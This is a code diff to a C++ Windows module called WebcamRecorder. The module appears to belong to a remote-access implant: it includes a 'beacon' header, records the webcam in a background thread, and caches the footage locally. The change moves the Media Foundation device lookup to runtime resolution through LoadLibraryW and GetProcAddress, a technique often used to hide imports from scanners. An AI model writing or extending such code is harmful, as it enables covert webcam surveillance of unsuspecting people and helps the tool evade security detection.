@@ -3,6 +3,7 @@
 #include "../utils.h"
 #include "../beacon.h"
 #include <windows.h>
+#include <ctime>
 #include <mfapi.h>
 #include <mfidl.h>
 #include <mfreadwrite.h>
@@ -14,9 +15,25 @@ namespace WebcamRecorder {
     bool recording = false;
     HANDLE hThread = NULL;
     int durationSec = 30;
+
+    typedef HRESULT (WINAPI *MFEnumDeviceSources_t)(IMFAttributes*, IMFActivate***, UINT32*);
+    static MFEnumDeviceSources_t pMFEnumDeviceSources = nullptr;
+    static bool mfLoaded = false;
+
+    static bool LoadMF() {
+        if (mfLoaded) return pMFEnumDeviceSources != nullptr;
+        HMODULE hMF = LoadLibraryW(L"mf.dll");
+        if (hMF) {
+            pMFEnumDeviceSources = (MFEnumDeviceSources_t)GetProcAddress(hMF, "MFEnumDeviceSources");
+        }
+        mfLoaded = true;
+        return pMFEnumDeviceSources != nullptr;
+    }
     
     DWORD WINAPI RecordThread(LPVOID param) {
         CreateDirectoryA(WEBCAM_CACHE_PATH, NULL);
+        
+        if (!LoadMF()) return 1;
         
         IMFMediaSource* pSource = NULL;
         IMFSourceReader* pReader = NULL;
@@ -27,7 +44,7 @@ namespace WebcamRecorder {
         
         IMFActivate** ppDevices = NULL;
         UINT32 count = 0;
-        MFEnumDeviceSources(pAttributes, &ppDevices, &count);
+        pMFEnumDeviceSources(pAttributes, &ppDevices, &count);
         
         if (count == 0) {
             pAttributes->Release();
